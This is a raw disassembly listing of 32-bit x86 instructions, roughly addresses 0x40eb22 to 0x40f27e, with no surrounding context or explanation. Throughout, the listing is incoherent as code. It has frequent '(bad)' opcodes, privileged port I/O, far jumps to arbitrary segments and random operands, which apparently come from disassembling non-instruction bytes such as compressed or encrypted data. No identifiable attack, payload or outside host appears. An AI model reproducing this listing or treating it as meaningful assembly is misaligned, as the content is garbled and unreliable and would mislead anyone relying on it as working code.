  40eb22:	and    BYTE PTR [edi+0x39],al
  40eb25:	mov    esi,0x246b93f1
  40eb2a:	dec    edi
  40eb2b:	and    BYTE PTR [edi-0x72440bfc],dl
  40eb31:	lods   eax,DWORD PTR ds:[esi]
  40eb32:	jne    0x40eb65
  40eb34:	call   0x791b:0xac7d0e0c
  40eb3b:	mov    ?,WORD PTR [esi+0x54367a86]
  40eb41:	das    
  40eb42:	outs   dx,DWORD PTR ds:[esi]
  40eb43:	xchg   DWORD PTR [ebp-0x1cad9323],ebp
  40eb49:	adc    al,0xe9
  40eb4b:	dec    ebp
  40eb4c:	dec    esi
  40eb4d:	jbe    0x40eb65
  40eb4f:	jno    0x40eb85
  40eb51:	xor    eax,0x200c01dc
  40eb56:	dec    edi
  40eb57:	or     edx,DWORD PTR [eax+0x687ceafd]
  40eb5d:	adc    ah,BYTE PTR [ecx-0x6ecab0ed]
  40eb63:	sub    cl,BYTE PTR [ebx]
  40eb65:	std    
  40eb66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb67:	inc    esi
  40eb68:	mov    edx,0x25ff265b
  40eb6d:	int    0x14
  40eb6f:	inc    eax
  40eb70:	outs   dx,BYTE PTR ds:[esi]
  40eb71:	std    
  40eb72:	and    al,0x7b
  40eb74:	fwait
  40eb75:	mov    ebx,0xbce3fd9b
  40eb7a:	adc    al,0xe9
  40eb7c:	mov    dh,0x58
  40eb7e:	out    0x82,al
  40eb80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb81:	in     eax,dx
  40eb82:	stos   BYTE PTR es:[edi],al
  40eb83:	icebp  
  40eb84:	add    eax,0xed038331
  40eb89:	cmp    DWORD PTR [ebp+edi*4+0x30],esi
  40eb8d:	inc    esi
  40eb8e:	cmp    DWORD PTR [edx],edi
  40eb90:	pop    esp
  40eb91:	out    dx,eax
  40eb92:	push   eax
  40eb93:	jb     0x40eb99
  40eb95:	add    bl,BYTE PTR [eax]
  40eb97:	sub    BYTE PTR [edx+0x445510c],cl
  40eb9d:	add    DWORD PTR [ecx+ecx*1+0x34],edi
  40eba1:	jo     0x40eb9f
  40eba3:	pop    ss
  40eba4:	outs   dx,BYTE PTR ds:[esi]
  40eba5:	addr16 mov edx,0x8b3d2071
  40ebab:	mov    al,ds:0x986f42ff
  40ebb0:	imul   ecx,DWORD PTR [edi],0xc3c0336c
  40ebb6:	or     al,0x8d
  40ebb8:	inc    eax
  40ebb9:	or     esi,edi
  40ebbb:	imul   esi,DWORD PTR [edx-0x4c],0x44
  40ebbf:	cmp    BYTE PTR [ebx+eiz*8+0x74d31028],ah
  40ebc6:	test   dh,al
  40ebc8:	dec    ebx
  40ebc9:	adc    esp,0x30c51d12
  40ebcf:	and    BYTE PTR [edx],0x27
  40ebd2:	call   DWORD PTR [edx+esi*8+0x458bf621]
  40ebd9:	mov    ds:0x3a9656e6,eax
  40ebde:	or     DWORD PTR [eax-0x58404672],edx
  40ebe4:	hlt    
  40ebe5:	pop    esi
  40ebe6:	int3   
  40ebe7:	adc    ch,BYTE PTR [ebx+0x14ff3089]
  40ebed:	sub    eax,DWORD PTR [ebp-0x65b9d9a5]
  40ebf3:	jns    0x40ebc1
  40ebf5:	mov    ch,0x57
  40ebf7:	sbb    dh,bh
  40ebf9:	aas    
  40ebfa:	mov    al,ds:0x48618fa
  40ebff:	mov    ebp,DWORD PTR [esi+0x63f2f360]
  40ec05:	enter  0xcab,0x85
  40ec09:	shr    BYTE PTR ds:0x722d0527,0xd6
  40ec10:	pop    ss
  40ec11:	xchg   ecx,eax
  40ec12:	dec    esi
  40ec13:	mov    bp,0x9088
  40ec17:	fidivr DWORD PTR [eax+0x44]
  40ec1a:	lock imul ecx,DWORD PTR [edi-0x41e1b3ac],0xffffffd6
  40ec22:	icebp  
  40ec23:	and    ebp,DWORD PTR [eax-0x574e4369]
  40ec29:	cmp    BYTE PTR [ebp-0x40],cl
  40ec2c:	inc    edx
  40ec2d:	(bad)  
  40ec2e:	mov    edi,0xc49227e4
  40ec33:	js     0x40ecac
  40ec35:	cmp    al,0xe5
  40ec37:	in     eax,dx
  40ec38:	out    dx,al
  40ec39:	jecxz  0x40ebe6
  40ec3b:	aas    
  40ec3c:	fnstcw WORD PTR [ebx+0x5f]
  40ec3f:	cdq    
  40ec40:	and    al,0x15
  40ec42:	cmp    edi,esp
  40ec44:	push   ecx
  40ec45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec46:	inc    ebp
  40ec47:	retf   
  40ec48:	xlat   BYTE PTR ds:[ebx]
  40ec49:	cmp    BYTE PTR [edi-0x76],ah
  40ec4c:	pop    ecx
  40ec4d:	scas   eax,DWORD PTR es:[edi]
  40ec4e:	gs cmp al,0x3a
  40ec51:	test   al,0xe7
  40ec53:	adc    DWORD PTR [edx-0x20b0c9d8],esp
  40ec59:	xor    DWORD PTR [edx-0x62c11ba1],ebp
  40ec5f:	sti    
  40ec60:	mov    esp,0x9fae7d9c
  40ec65:	or     al,0x8b
  40ec67:	imul   ecx,DWORD PTR [eax-0x58],0xfffffffe
  40ec6b:	cwde   
  40ec6c:	(bad)  
  40ec6d:	retf   0x7a6c
  40ec70:	fbstp  TBYTE PTR [ecx]
  40ec72:	nop    DWORD PTR ss:[edx+edi*4-0x24]
  40ec78:	mov    ebp,0x4e8431cb
  40ec7d:	cwde   
  40ec7e:	sub    al,0x63
  40ec80:	test   DWORD PTR [edi],eax
  40ec82:	daa    
  40ec83:	and    BYTE PTR [ebx],ch
  40ec85:	sbb    al,0xfe
  40ec87:	mov    ds:0x2afd719e,eax
  40ec8c:	and    esp,DWORD PTR [esi*1-0x3869444]
  40ec93:	xchg   edi,eax
  40ec94:	mov    bl,0x9e
  40ec96:	jnp    0x40ecaf
  40ec98:	mov    dl,0x36
  40ec9a:	shr    BYTE PTR [edi-0x187c7464],1
  40eca0:	xor    al,0xf8
  40eca2:	dec    edx
  40eca3:	adc    ebp,DWORD PTR [ebx+0x36]
  40eca6:	add    al,0xb
  40eca8:	jl     0xa3bd448a
  40ecae:	cmp    ebx,DWORD PTR [ebx-0x7c]
  40ecb1:	int    0xe4
  40ecb3:	and    BYTE PTR [edi-0x2b],dl
  40ecb6:	dec    edi
  40ecb7:	mov    dh,BYTE PTR [ebx+0x2f90e74e]
  40ecbd:	call   0x9648ae5f
  40ecc2:	sub    cl,ah
  40ecc4:	mov    dl,0x81
  40ecc6:	out    dx,al
  40ecc7:	cmp    eax,0xe63663b1
  40eccc:	in     al,0x17
  40ecce:	data16 cmp bl,BYTE PTR [ebx+ecx*1+0x7b3ef67a]
  40ecd6:	ins    DWORD PTR es:[edi],dx
  40ecd7:	push   es
  40ecd8:	add    DWORD PTR [ebp-0x55ef0ec],eax
  40ecde:	rcl    ch,0x98
  40ece1:	adc    ch,bl
  40ece3:	call   0x86f68674
  40ece8:	gs test BYTE PTR gs:[ebx+0x9],ch
  40eced:	cmc    
  40ecee:	or     BYTE PTR [edx+0xd],0x3f
  40ecf2:	xchg   ebp,eax
  40ecf3:	push   es
  40ecf4:	xchg   ebp,eax
  40ecf5:	adc    ebx,DWORD PTR [ecx]
  40ecf7:	lock mov eax,ds:0x67f83c11
  40ecfd:	pop    eax
  40ecfe:	repz or bh,ah
  40ed01:	pop    esi
  40ed02:	bnd jo 0x40ecf8
  40ed05:	jae    0x40ecd2
  40ed07:	adc    al,dh
  40ed09:	stos   DWORD PTR es:[edi],eax
  40ed0a:	xchg   ebp,eax
  40ed0b:	xor    eax,0x25251c34
  40ed10:	hlt    
  40ed11:	ret    
  40ed12:	loope  0x40ecbe
  40ed14:	jl     0x40ed92
  40ed16:	daa    
  40ed17:	aad    0x12
  40ed19:	pop    eax
  40ed1a:	jl     0x40ed7f
  40ed1c:	add    DWORD PTR [edx+0x38],edx
  40ed1f:	imul   esp,DWORD PTR [esi+0x6dc12ec],0x64
  40ed26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed27:	sub    edx,ebp
  40ed29:	test   BYTE PTR [edx],ch
  40ed2b:	fcmovb st,st(5)
  40ed2d:	push   edx
  40ed2e:	jge    0x40ed7f
  40ed30:	xchg   esi,eax
  40ed31:	mov    edi,0x7761be57
  40ed36:	add    dl,cl
  40ed38:	xchg   BYTE PTR [esi-0x628ee079],bh
  40ed3e:	jge    0x40eccf
  40ed40:	jns    0x40ecfe
  40ed42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed43:	or     bl,ah
  40ed45:	rcl    BYTE PTR [ecx-0x75f9248b],0xc5
  40ed4c:	enter  0xc5fd,0xf8
  40ed50:	jnp    0x40ed49
  40ed52:	mov    eax,ds:0x2295449c
  40ed57:	mov    bh,0x3c
  40ed59:	mov    dh,BYTE PTR [eax+0x16c3a14f]
  40ed5f:	inc    esi
  40ed60:	std    
  40ed61:	mov    edi,0x24bc8aca
  40ed66:	div    DWORD PTR [edi-0x2757ef9f]
  40ed6c:	in     al,dx
  40ed6d:	test   eax,0xf2118c19
  40ed72:	(bad)  
  40ed73:	popa   
  40ed74:	and    eax,0x2537e08a
  40ed79:	(bad)  [eax+edx*1-0x3d]
  40ed7d:	jmp    0x40ede3
  40ed7f:	mov    ah,0xfd
  40ed81:	sub    al,0xef
  40ed83:	jnp    0x40ed8a
  40ed85:	ins    DWORD PTR es:[edi],dx
  40ed86:	jno    0x40edbc
  40ed88:	mov    esp,es
  40ed8a:	inc    eax
  40ed8b:	sub    BYTE PTR [edi],dh
  40ed8d:	jne    0x40ed8a
  40ed8f:	jne    0x40edca
  40ed91:	push   ecx
  40ed92:	mov    bh,0x51
  40ed94:	pop    ss
  40ed95:	loopne 0x40ed99
  40ed97:	sahf   
  40ed98:	popa   
  40ed99:	lods   al,BYTE PTR ds:[esi]
  40ed9a:	retf   
  40ed9b:	sbb    cl,al
  40ed9d:	iret   
  40ed9e:	sbb    eax,0x7365b77f
  40eda3:	(bad)  
  40eda4:	fild   QWORD PTR [ecx+0x6d5db8a8]
  40edaa:	add    ebx,DWORD PTR [edi]
  40edac:	fs add edi,ebp
  40edaf:	shr    ebx,cl
  40edb1:	mov    ah,0xad
  40edb3:	xchg   edx,eax
  40edb4:	mov    al,0x75
  40edb6:	scas   al,BYTE PTR es:[edi]
  40edb7:	pop    esp
  40edb8:	inc    eax
  40edb9:	(bad)  
  40edba:	out    0xe0,eax
  40edbc:	lea    esi,[esi+0x74]
  40edbf:	push   edi
  40edc0:	in     eax,0xf3
  40edc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edc3:	inc    esi
  40edc4:	mov    ebx,0xf74a3fbc
  40edc9:	or     ch,BYTE PTR [eax]
  40edcb:	data16 xor BYTE PTR [ebp+0x6393c70e],bl
  40edd2:	arpl   WORD PTR [ebp+0x5],sp
  40edd5:	push   ebp
  40edd6:	cmp    BYTE PTR [esi-0x12],dh
  40edd9:	jns    0x40ed89
  40eddb:	adc    eax,0x8f37c884
  40ede0:	dec    ecx
  40ede1:	sub    DWORD PTR [ecx+ebp*2-0x51],ebx
  40ede5:	popa   
  40ede6:	push   ds
  40ede7:	ins    DWORD PTR es:[edi],dx
  40ede8:	cld    
  40ede9:	loope  0x40edf1
  40edeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edec:	sar    BYTE PTR [ebx+ebp*1],0x62
  40edf0:	clc    
  40edf1:	sar    edx,cl
  40edf3:	sub    DWORD PTR [ebp-0x3e],edi
  40edf6:	cdq    
  40edf7:	jmp    0x40ed83
  40edf9:	xor    eax,0x212aa56e
  40edfe:	imul   ecx,ebx,0xfffffff3
  40ee01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee02:	outs   dx,BYTE PTR ds:[esi]
  40ee03:	mov    dl,0xd0
  40ee05:	adc    al,0x75
  40ee07:	sbb    al,0xa1
  40ee09:	das    
  40ee0a:	fxch   st(2)
  40ee0c:	cmp    eax,0xeff1d24d
  40ee11:	or     DWORD PTR [eax+0x1a],ecx
  40ee14:	cmp    BYTE PTR [esi],dh
  40ee16:	xor    edi,DWORD PTR [eax-0x42]
  40ee19:	enter  0xa329,0xf8
  40ee1d:	sub    cl,BYTE PTR [esi+0x3fc63db9]
  40ee23:	adc    ebx,DWORD PTR [ebp+0x4c]
  40ee26:	ss (bad) 
  40ee28:	mov    edi,0xd59c78e6
  40ee2d:	aam    0x6b
  40ee2f:	dec    esi
  40ee30:	mov    edi,0x98f4276d
  40ee35:	aam    0xd8
  40ee37:	pop    esp
  40ee38:	pop    esp
  40ee39:	mov    ds:0x615ec81f,eax
  40ee3e:	shl    esi,cl
  40ee40:	dec    esi
  40ee41:	jp     0x40ee56
  40ee43:	out    0x5a,al
  40ee45:	mov    edx,0xa35f5e3b
  40ee4a:	out    dx,al
  40ee4b:	sbb    ecx,ebp
  40ee4d:	pop    edx
  40ee4e:	rcr    BYTE PTR [esi-0x602eff07],0x75
  40ee55:	mov    esp,0xbbe39435
  40ee5a:	fsubrp st(7),st
  40ee5c:	add    cl,al
  40ee5e:	push   esp
  40ee5f:	fnstcw WORD PTR [ebx*1+0x7165c6ed]
  40ee66:	ja     0x40edf8
  40ee68:	or     eax,0x31f352ef
  40ee6d:	xchg   sp,ax
  40ee6f:	add    al,0x55
  40ee71:	or     ch,bl
  40ee73:	adc    cl,BYTE PTR [ecx-0xf]
  40ee76:	or     al,0x3
  40ee78:	daa    
  40ee79:	psubusw mm1,QWORD PTR [edx]
  40ee7c:	pop    ds
  40ee7d:	or     DWORD PTR [esi],ecx
  40ee7f:	jae    0x40ee29
  40ee81:	pusha  
  40ee82:	ins    BYTE PTR es:[edi],dx
  40ee83:	xchg   ebx,eax
  40ee84:	stos   DWORD PTR es:[edi],eax
  40ee85:	mov    ebp,0xf3519920
  40ee8a:	fs sbb eax,0xf1645d83
  40ee90:	loop   0x40ee64
  40ee92:	pop    ss
  40ee93:	add    dh,BYTE PTR [ebp-0x3e]
  40ee96:	es xor al,0xd1
  40ee99:	push   ds
  40ee9a:	outs   dx,BYTE PTR ds:[esi]
  40ee9b:	push   edx
  40ee9c:	mov    BYTE PTR [edi],bh
  40ee9e:	rcl    DWORD PTR [eax+esi*2+0x31],cl
  40eea2:	ficomp DWORD PTR [esp]
  40eea5:	xlat   BYTE PTR ds:[ebx]
  40eea6:	lahf   
  40eea7:	xchg   ebp,eax
  40eea8:	iret   
  40eea9:	jnp    0x40eede
  40eeab:	ret    
  40eeac:	pushf  
  40eead:	jg     0x40ee3a
  40eeaf:	xchg   DWORD PTR [esi],eax
  40eeb1:	mov    esp,?
  40eeb3:	sub    edi,DWORD PTR [ebp-0x22]
  40eeb6:	rol    DWORD PTR [ecx],1
  40eeb8:	mov    DWORD PTR [ebp-0x19e174ff],eax
  40eebe:	arpl   WORD PTR [ebp-0x74],dx
  40eec1:	mov    ds:0x343004f8,al
  40eec6:	sbb    al,0x78
  40eec8:	aas    
  40eec9:	repnz fistp DWORD PTR [ebp+0x21]
  40eecd:	cmp    al,0x0
  40eecf:	sub    al,0xae
  40eed1:	int    0x46
  40eed3:	fsubr  DWORD PTR [edx]
  40eed5:	dec    ecx
  40eed6:	xor    eax,DWORD PTR [edx+0x42b5db4f]
  40eedc:	mov    edx,0x8e6760d3
  40eee1:	outs   dx,DWORD PTR ds:[esi]
  40eee2:	inc    edi
  40eee3:	jnp    0x40ee76
  40eee5:	pop    ds
  40eee6:	push   ss
  40eee7:	push   eax
  40eee8:	test   DWORD PTR es:[ecx+0x55],0xd76a3d3
  40eef0:	mov    esi,0x9396ee2f
  40eef5:	jne    0x40ee98
  40eef7:	test   eax,0x73ac76ef
  40eefc:	adc    DWORD PTR [ebx],ecx
  40eefe:	lock fwait
  40ef00:	push   ecx
  40ef01:	inc    edx
  40ef02:	sar    DWORD PTR [edx-0x6b],1
  40ef05:	xchg   edi,eax
  40ef06:	fcmovu st,st(1)
  40ef08:	mov    eax,0xab12916e
  40ef0d:	lea    esp,[ebp+0x3eed5ba7]
  40ef13:	dec    esp
  40ef14:	sub    BYTE PTR [ebx],0xf5
  40ef17:	out    dx,al
  40ef18:	and    bl,al
  40ef1a:	add    BYTE PTR [ebx],ah
  40ef1c:	xchg   esp,eax
  40ef1d:	cvttps2pi mm2,QWORD PTR [edi-0x3a7d7939]
  40ef24:	mov    esi,0x71b09dff
  40ef29:	ss dec edi
  40ef2b:	jecxz  0x40ef25
  40ef2d:	sbb    al,0x49
  40ef2f:	add    al,bl
  40ef31:	jmp    0xf762:0xef9c5b70
  40ef38:	jmp    0x4d7a:0x1e9607fb
  40ef3f:	or     bh,BYTE PTR [esi]
  40ef41:	dec    esp
  40ef42:	mov    eax,0x55704192
  40ef47:	out    dx,al
  40ef48:	fs je  0x40ef7a
  40ef4b:	out    0x12,al
  40ef4d:	es and eax,0x138a410f
  40ef53:	cli    
  40ef54:	fbld   TBYTE PTR [ebx+0x54]
  40ef57:	xchg   ebx,eax
  40ef58:	retf   0x3003
  40ef5b:	mov    ds:0x443e202e,al
  40ef60:	enter  0x88f7,0x4a
  40ef64:	dec    edx
  40ef65:	xor    bh,cl
  40ef67:	mov    bh,al
  40ef69:	add    eax,0xe2ea77a4
  40ef6e:	lock popa 
  40ef70:	int3   
  40ef71:	jmp    0xa1f0:0x54ebd12c
  40ef78:	ds (bad) 
  40ef7b:	pop    es
  40ef7c:	nop
  40ef7d:	fwait
  40ef7e:	add    edx,esi
  40ef80:	sub    eax,0x48836ea5
  40ef85:	push   edx
  40ef86:	or     esi,DWORD PTR [eax]
  40ef88:	push   eax
  40ef89:	and    eax,0x1ebc8270
  40ef8e:	mov    ebp,0xb15f759a
  40ef93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef94:	imul   edx,DWORD PTR [edi],0x16a92bd
  40ef9a:	js     0x40efa4
  40ef9c:	or     DWORD PTR [edx],edi
  40ef9e:	jnp    0x40eff1
  40efa0:	jno    0x40ef3b
  40efa2:	jbe    0x40ef39
  40efa4:	or     eax,0x1257d3c6
  40efa9:	popa   
  40efaa:	adc    dl,0x6a
  40efad:	scas   eax,DWORD PTR es:[edi]
  40efae:	inc    eax
  40efaf:	mov    al,0x9e
  40efb1:	(bad)  
  40efb2:	dec    esp
  40efb3:	fistp  WORD PTR ds:[esi]
  40efb6:	fisttp WORD PTR ds:0xa06af088
  40efbc:	and    edx,DWORD PTR [eax+0x3]
  40efbf:	iret   
  40efc0:	in     al,0x7d
  40efc2:	frstor [eax-0x512bb7ca]
  40efc8:	mov    dh,0x6e
  40efca:	push   ecx
  40efcb:	test   BYTE PTR [esi+0x5e],dl
  40efce:	lea    ebx,ds:0x747b87fc
  40efd4:	out    0x0,ax
  40efd7:	xchg   ebx,eax
  40efd8:	jnp    0x40ef67
  40efda:	sbb    al,0xc1
  40efdc:	add    al,0x0
  40efde:	repnz inc edx
  40efe0:	pop    ss
  40efe1:	dec    edx
  40efe2:	xor    BYTE PTR [edx-0x32],bh
  40efe5:	mov    BYTE PTR [ebx],ch
  40efe7:	xchg   ebx,eax
  40efe8:	sbb    DWORD PTR fs:[edx+0x260c32fc],eax
  40efef:	loopne 0x40ef8f
  40eff1:	adc    ebx,esp
  40eff3:	push   eax
  40eff4:	or     al,0x81
  40eff6:	xor    DWORD PTR [ebp+0x9],esp
  40eff9:	jle    0x40efa9
  40effb:	ja     0x40f064
  40effd:	(bad)  
  40efff:	pop    es
  40f000:	daa    
  40f001:	out    dx,eax
  40f002:	aad    0xef
  40f004:	arpl   WORD PTR [ecx+0x14],bx
  40f007:	push   cs
  40f008:	adc    al,BYTE PTR [edi+0x1b9cddff]
  40f00e:	jns    0x40f058
  40f010:	mov    edx,0x83b6d9c6
  40f015:	sbb    ah,BYTE PTR [eax]
  40f017:	mov    eax,0x533b7b23
  40f01c:	mov    BYTE PTR [edi],dh
  40f01e:	mov    eax,0x56e27d6d
  40f023:	scas   al,BYTE PTR es:[edi]
  40f024:	call   0x74e6:0x1c1a43ca
  40f02b:	lock mov ch,0x44
  40f02e:	ss mov ecx,0x43a2e180
  40f034:	icebp  
  40f035:	inc    ecx
  40f036:	lods   al,BYTE PTR ds:[esi]
  40f037:	push   cs
  40f038:	stos   DWORD PTR es:[edi],eax
  40f039:	cmp    al,0xec
  40f03b:	(bad)  
  40f03c:	stc    
  40f03d:	in     eax,0x78
  40f03f:	sbb    al,0xd
  40f041:	push   edi
  40f042:	jno    0x40f08b
  40f044:	jb     0x40f05d
  40f046:	stc    
  40f047:	sbb    edi,DWORD PTR [ebp+0x26]
  40f04a:	pop    ebp
  40f04b:	and    al,0x37
  40f04d:	mov    al,ds:0x695ed60
  40f052:	loope  0x40f0a5
  40f054:	pop    edx
  40f055:	stc    
  40f056:	xor    ch,dl
  40f058:	sbb    BYTE PTR [esi-0x56a3ef1a],bl
  40f05e:	mul    BYTE PTR [esi-0x235e9f5a]
  40f064:	cmp    BYTE PTR [edx],cl
  40f066:	sbb    ebp,DWORD PTR [edi+0x7e826eca]
  40f06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f06d:	and    eax,0x1ecb255a
  40f072:	mov    esp,0x83ecac3a
  40f077:	addr16 sbb edx,esi
  40f07a:	mov    ah,0xa3
  40f07c:	dec    esp
  40f07d:	pop    ss
  40f07e:	inc    ebp
  40f07f:	aam    0x19
  40f081:	mov    eax,?
  40f083:	div    DWORD PTR [ebp+0x2ce1746f]
  40f089:	and    eax,0x223d5a37
  40f08e:	ret    0x86f5
  40f091:	mov    dh,0xa7
  40f093:	inc    edi
  40f094:	mov    bl,0x74
  40f096:	loop   0x40f0aa
  40f098:	xchg   edi,eax
  40f099:	std    
  40f09a:	arpl   WORD PTR [ecx-0x2a],si
  40f09d:	xor    eax,DWORD PTR [edi+0x38]
  40f0a0:	cmp    al,BYTE PTR [edx-0x5c274e16]
  40f0a6:	mov    ebx,DWORD PTR [eax-0x5dbb87b2]
  40f0ac:	jne    0x40f119
  40f0ae:	lahf   
  40f0af:	inc    DWORD PTR [edi]
  40f0b1:	inc    eax
  40f0b2:	scas   al,BYTE PTR es:[edi]
  40f0b3:	or     eax,0x669cf33
  40f0b8:	inc    ecx
  40f0b9:	addr16 pop ss
  40f0bb:	pop    ebx
  40f0bc:	inc    ebp
  40f0bd:	out    0x10,al
  40f0bf:	fcomp  QWORD PTR [esi-0x58ffb661]
  40f0c5:	mov    BYTE PTR [edx],dl
  40f0c7:	adc    bh,ch
  40f0c9:	stc    
  40f0ca:	fwait
  40f0cb:	imul   esi,DWORD PTR [ebx],0x57d823ac
  40f0d1:	push   0x39
  40f0d3:	(bad)  
  40f0d4:	sahf   
  40f0d5:	fcomp  st(3)
  40f0d7:	inc    ebp
  40f0d8:	xchg   edx,eax
  40f0d9:	fwait
  40f0da:	add    al,0xd8
  40f0dc:	xlat   BYTE PTR ds:[ebx]
  40f0dd:	scas   eax,DWORD PTR es:[edi]
  40f0de:	or     al,0x66
  40f0e0:	and    esi,esp
  40f0e2:	cmp    ch,cl
  40f0e4:	test   al,0x1e
  40f0e6:	rcl    BYTE PTR [ecx-0xe],cl
  40f0e9:	bound  ebp,QWORD PTR [ecx-0x26]
  40f0ec:	cmp    ch,BYTE PTR [edi]
  40f0ee:	xchg   ecx,eax
  40f0ef:	test   BYTE PTR [ebx+0x3c46d37d],0x9f
  40f0f6:	sub    BYTE PTR [eax-0x12c3ec89],cl
  40f0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0fd:	sub    DWORD PTR [eax],esi
  40f0ff:	add    dl,bl
  40f101:	(bad)  
  40f102:	fisttp DWORD PTR [edx+0x26]
  40f105:	xor    DWORD PTR [edi-0x5a],edi
  40f108:	jno    0x40f165
  40f10a:	mov    eax,ds:0x81dc5677
  40f10f:	call   0x2f5eb5c0
  40f114:	pop    ebx
  40f115:	cs pop esi
  40f117:	push   ss
  40f118:	mov    edx,ds
  40f11a:	bound  esi,QWORD PTR [eax+0x5c0f3f46]
  40f120:	dec    ebp
  40f121:	jl     0x40f0b4
  40f123:	(bad)  
  40f125:	ret    
  40f126:	outs   dx,DWORD PTR ds:[esi]
  40f127:	jmp    0x40f0bf
  40f129:	es repnz stc 
  40f12c:	fxch   st(5)
  40f12e:	(bad)  
  40f130:	call   0x69170449
  40f135:	ficomp WORD PTR [eax+esi*4-0x71acfb71]
  40f13c:	dec    ebx
  40f13d:	add    al,0xd7
  40f13f:	mov    edi,edi
  40f141:	mov    esp,0x60e52e3c
  40f146:	subps  xmm5,XMMWORD PTR [eax+edx*8]
  40f14a:	ret    0x7398
  40f14d:	or     DWORD PTR [esi+0x2a],edi
  40f150:	retf   
  40f151:	out    0xaf,al
  40f153:	cli    
  40f154:	xchg   esi,eax
  40f155:	imul   ebx,DWORD PTR [ebx+0x1e],0xa3b0ff17
  40f15c:	push   ecx
  40f15d:	std    
  40f15e:	add    esp,eax
  40f160:	dec    esi
  40f161:	and    BYTE PTR [eax],dh
  40f163:	(bad)  
  40f164:	loope  0x40f1da
  40f166:	popa   
  40f167:	fldenv [esp+edx*8-0x2e]
  40f16b:	adc    al,0x69
  40f16d:	cmp    al,0x48
  40f16f:	iret   
  40f170:	aam    0xd8
  40f172:	lds    edx,FWORD PTR [ecx+eax*8+0x65]
  40f176:	ret    0x4a56
  40f179:	jo     0x40f106
  40f17b:	mov    ebp,0x7981d0ed
  40f180:	dec    eax
  40f181:	sbb    esi,DWORD PTR [ebp-0x21f8dcaa]
  40f187:	shr    DWORD PTR [edi],0x34
  40f18a:	sar    eax,0xf8
  40f18d:	gs mov cl,0x6c
  40f190:	addr16 iret 
  40f192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f193:	xchg   ecx,eax
  40f194:	outs   dx,BYTE PTR ds:[esi]
  40f195:	jne    0x40f144
  40f197:	fwait
  40f198:	xchg   edi,eax
  40f199:	adc    esp,eax
  40f19b:	mov    cl,0xac
  40f19d:	push   ebx
  40f19e:	sbb    bl,ch
  40f1a0:	lahf   
  40f1a1:	mov    edi,0x1bbc2969
  40f1a6:	pop    ss
  40f1a7:	cmp    al,0x12
  40f1a9:	dec    edi
  40f1aa:	jecxz  0x40f1ff
  40f1ac:	nop
  40f1ad:	(bad)  
  40f1ae:	int    0x42
  40f1b0:	std    
  40f1b1:	fstp   DWORD PTR [eax+eiz*4-0x75]
  40f1b5:	dec    edx
  40f1b6:	mov    esi,0x2248304a
  40f1bb:	clc    
  40f1bc:	jb     0x40f206
  40f1be:	jbe    0x40f1a5
  40f1c0:	mov    DWORD PTR [ecx+ebx*8],ecx
  40f1c3:	dec    ecx
  40f1c4:	data16 cmp ah,ah
  40f1c7:	xor    ah,BYTE PTR [edi]
  40f1c9:	sar    BYTE PTR [edi-0x52],0x31
  40f1cd:	pop    ebp
  40f1ce:	add    eax,edi
  40f1d0:	sbb    ch,BYTE PTR [ebp+0x3bcddf12]
  40f1d6:	adc    eax,0x2be6f419
  40f1db:	sbb    edi,eax
  40f1dd:	nop
  40f1de:	push   0x3e
  40f1e0:	lahf   
  40f1e1:	ja     0x40f245
  40f1e3:	outs   dx,DWORD PTR ds:[esi]
  40f1e4:	div    dh
  40f1e6:	dec    edi
  40f1e7:	add    bl,BYTE PTR [eax]
  40f1e9:	test   al,0x5d
  40f1eb:	adc    al,0x45
  40f1ed:	dec    edi
  40f1ee:	xchg   esi,eax
  40f1ef:	out    0x9c,al
  40f1f1:	popf   
  40f1f2:	mov    bh,0xdb
  40f1f4:	xchg   esi,eax
  40f1f5:	scas   eax,DWORD PTR es:[edi]
  40f1f6:	cmc    
  40f1f7:	inc    ebp
  40f1f8:	js     0x40f202
  40f1fa:	scas   al,BYTE PTR es:[edi]
  40f1fb:	mov    edx,0xe70c2481
  40f200:	cmp    eax,0x4a6c64b3
  40f205:	or     DWORD PTR [edi+0x77b495f1],edi
  40f20b:	xor    eax,0x2e2d169b
  40f210:	jmp    0xd4071237
  40f215:	pop    ecx
  40f216:	push   edx
  40f217:	xchg   edi,eax
  40f218:	xchg   esp,eax
  40f219:	mov    DWORD PTR [edx],esp
  40f21b:	fimul  WORD PTR [eax]
  40f21d:	in     al,dx
  40f21e:	sbb    eax,DWORD PTR gs:[ebp-0x11babc13]
  40f225:	xor    BYTE PTR [eax],dl
  40f227:	push   0x9d33a532
  40f22c:	sbb    DWORD PTR [edx+0x62],ebp
  40f22f:	dec    ebx
  40f230:	sbb    esi,esi
  40f232:	fldenv [edi+0xbc19cd1]
  40f238:	xor    al,0x2f
  40f23a:	xchg   ebx,eax
  40f23b:	std    
  40f23c:	add    ecx,DWORD PTR [edi]
  40f23e:	dec    esi
  40f23f:	or     BYTE PTR [edi],bl
  40f241:	and    BYTE PTR [edi],al
  40f243:	ins    DWORD PTR es:[edi],dx
  40f244:	mov    esi,0xb918492e
  40f249:	addr16 push esi
  40f24b:	add    DWORD PTR [ecx+0x77d893cc],eax
  40f251:	cmp    ebp,DWORD PTR [ebp+0x7b]
  40f254:	mov    esp,0xa6791f14
  40f259:	cmp    ch,al
  40f25b:	fcmovnb st,st(1)
  40f25d:	adc    cl,BYTE PTR [esi]
  40f25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f260:	(bad)  
  40f261:	jp     0x40f1ec
  40f263:	xchg   edi,eax
  40f264:	add    al,0xa4
  40f266:	je     0x40f2af
  40f268:	ret    
  40f269:	scas   al,BYTE PTR es:[edi]
  40f26a:	pop    esp
  40f26b:	cli    
  40f26c:	mov    ebx,esi
  40f26e:	add    esp,esp
  40f270:	or     DWORD PTR [eax+0x6c7242d9],0xffffffce
  40f277:	sbb    al,0x32
  40f279:	jae    0x40f2e0
  40f27b:	shr    ebp,0xa1
  40f27e:	std    
